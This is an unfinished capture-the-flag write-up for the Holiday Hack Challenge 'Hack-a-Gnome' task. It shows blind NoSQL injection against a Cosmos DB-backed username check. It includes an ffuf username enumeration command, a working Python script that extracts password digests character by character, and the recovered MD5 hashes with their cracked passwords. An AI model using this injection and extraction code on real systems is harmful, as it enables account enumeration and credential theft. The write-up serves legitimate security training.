+++
date = '2025-11-30T11:47:39+01:00'
draft = true
title = 'Hack-a-Gnome'
weight = 2
+++

![Chris Daves](/images/act3/chrisdavis-avatar.gif)

## Objective

Difficulty: 3/5

Davis in the Data Center is fighting a gnome army—join the hack-a-gnome fun.

## Chris Daves mission statement

> Hi, my name is Chris.
> 
> I like miniature war gaming and painting minis.
> 
> I enjoy open source projects and amateur robotics.
> 
> Hiking and kayaking are my favorite IRL activies.
> 
> I love single player video games with great stoylines.
> 
> ----
>
> Hey, I could really use another set of eyes on this gnome takeover situation.
> 
> Their systems have multiple layers of protection now - database authentication, web application vulnerabilities, and more!
> 
> But every system has weaknesses if you know where to look.
> 
> If these gnomes freeze the whole neighborhood, forget about hiking or kayaking—everything will be one giant ice rink. And trust me, miniature war gaming is a lot less fun when your paint freezes solid.
> 
> Ready to help me turn one of these rebellious bots against its own kind?

## Solution

URL https://hhc25-smartgnomehack-prod.holidayhackchallenge.com

### Inspecting Javascript

By inspecting the HTML source of the mainpage we find an interesting Javascript file, `https://hhc25-smartgnomehack-prod.holidayhackchallenge.com/static/script.js`. By reading it we get to know a few interesting endpoints

| Endpoint | Description |
| -------- | ----------- |
| /register | Endpoint for registering a new user | 
| /userAvailable?username= | In use to check wheter a username is available for registion upon creating a new user |

### Identifying the database

We identified the endpoints above, and the only endpoint taking arguments seems to be the `userAvailable` one. We were able to provoke an error message by sending in an `"` to the this endpoint:

```bash
https://hhc25-smartgnomehack-prod.holidayhackchallenge.com/userAvailable?username="
```

Output:

```json
{"error":"An error occurred while checking username: Message: {\"errors\":[{\"severity\":\"Error\",\"location\":{\"start\":44,\"end\":45},\"code\":\"SC1012\",\"message\":\"Syntax error, invalid string literal token '\\\"'.\"}]}\r\nActivityId: fc87623e-4f9b-4d3d-9b18-f56fefa1b5d9, Microsoft.Azure.Documents.Common/2.14.0"}
```

After a quick check using ChatGPT, it appears we are dealing with `Cosmos DB` here.

### Finding usernames

For this segment we were provided with the following hint from the hint system:

> Once you determine the type of database the gnome control factory's login is using, look up its documentation on default document types and properties. This information could help you generate a list of common English first names to try in your attack.

This seems straight forward. Just grab a list of names and fuzz away:

```bash
ffuf -w /usr/share/wordlists/seclists/Usernames/Names/names.txt -u https://hhc25-smartgnomehack-prod.holidayhackchallenge.com/userAvailable?username=FUZZ -X GET -fr "true"
```

We quickly identify the following users:

* bruce 
* harold

### Enumerating the database

We don't know Cosmos DB at all. But from looking at syntax examples online, every example seems to go like this: 

```sql
SELECT * FROM p WHERE p.something = something
```

From this we form the following workflow: 

1. Identify "p" - what value could be in use here?
2. Identify fields in use, Cosmos DB doesn't have a set schema
3. Extract password, if even possible

For this excercise we leave FFUF for now an move on to Python:

```python
import requests
import urllib.parse
import string
import sys
from pprint import pprint

#
# Helper function for injection
# 
def inject(base_url: str, payload: str) -> str:
    url = base_url + urllib.parse.quote_plus(payload)

    r = requests.get(url)
    
    return r.json()

#
# Map out prefix
#
def find_prefix(url, username):
    prefix_letter = None

    for prefix in string.ascii_letters:
        payload = f'{username}" AND IS_DEFINED({prefix}.username) --'
        result = inject(base_url, payload)

        if "error" in result.keys():
        	continue

        prefix_letter = prefix
        break

    return prefix_letter

# 
# Find password field name
#
def find_password_field(url, username, prefix):
	fields = []
	with open("burp-parameter-names.txt", "r") as f:
		for line in f.readlines():
			needle = line.strip("\n")
			payload = f'{username}" AND IS_DEFINED({prefix}.{needle}) --'
			result = inject(url, payload)

			if "error" in result.keys():
				continue

			if result.get("available") is False:
				fields.append(needle)

		return fields

#
# Find digest
# 
def find_digest(base_url, prefix, candidate="", username=""):
    for c in string.ascii_lowercase + string.digits + "-":
        if c in [":"]:
            continue

        p = candidate + c
        
        payload = f'{username}" AND STARTSWITH({prefix}.digest, "{p}") --'
        result = inject(base_url, payload)

        print(payload)
        if result["available"] is False:
            print(p)
            find_digest(base_url, prefix, p, username)
            break

#
# Main logic
#
base_url = "https://hhc25-smartgnomehack-prod.holidayhackchallenge.com/userAvailable?username="
prefix = find_prefix(base_url, "harold")
fields = find_password_field(base_url, "harold", prefix)

print("Prefix is: {prefix}")
print("Document fields is: ")
print("\n*".join(fields))

find_digest(base_url, prefix, "", "harold")
find_digest(base_url, prefix, "", "bruce")
```

From running this script we learn that

The `p` we were looking for is actually `c`. Furhter we identiy the following document fields:

```bash
ID
Id
USERNAME
UserName
Username
digest
id
userName
username
```

There are no "password" field, however we identify a `digest` field, which kinda is the same thing. Moving on we bruteforce the `digest` field for the two users we have found, and this is what we got: 

| Username | Digest (MD5) | Decoded | 
| -------- | ------------ | ------- |
| bruce  | d0a9ba00f80cbc56584ef245ffc56b9e | oatmeal12 |
| harold | 07f456ae6a94cb68d740df548847f459 | oatmeal!! |

The digest (passwords) are stored as MD5 - by simply visiting [Crackstation](https://crackstation.net) we easily decode them

### Logging in

## Chris Davis mission debrief

> 